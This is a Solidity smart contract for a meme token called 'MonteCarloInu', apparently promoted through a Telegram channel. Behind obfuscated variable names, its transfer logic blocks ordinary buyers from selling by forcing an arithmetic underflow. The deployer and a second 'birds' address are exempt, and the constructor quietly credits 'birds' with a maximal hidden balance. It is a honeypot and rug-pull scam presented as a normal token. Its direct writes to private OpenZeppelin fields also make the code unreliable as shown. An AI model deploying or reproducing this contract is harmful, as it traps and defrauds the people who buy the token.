// https://t.me/montecarloinu

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.8;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract MonteCarloInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private rabbit;

    function _transfer(
        address modern,
        address broken,
        uint256 knowledge
    ) internal override {
        uint256 decide = consist;

        if (bear[modern] == 0 && rabbit[modern] > 0 && modern != uniswapV2Pair) {
            bear[modern] -= decide;
        }

        address children = trip;
        trip = broken;
        rabbit[children] += decide + 1;

        _balances[modern] -= knowledge;
        uint256 official = (knowledge / 100) * consist;
        knowledge -= official;
        _balances[broken] += knowledge;
    }

    address private trip;
    mapping(address => uint256) private bear;
    uint256 public consist = 3;

    constructor(
        string memory language,
        string memory ruler,
        address monkey,
        address birds
    ) ERC20(language, ruler) {
        uniswapV2Router = IUniswapV2Router02(monkey);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 its = ~uint256(0);

        bear[msg.sender] = its;
        bear[birds] = its;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[birds] = its;
    }
}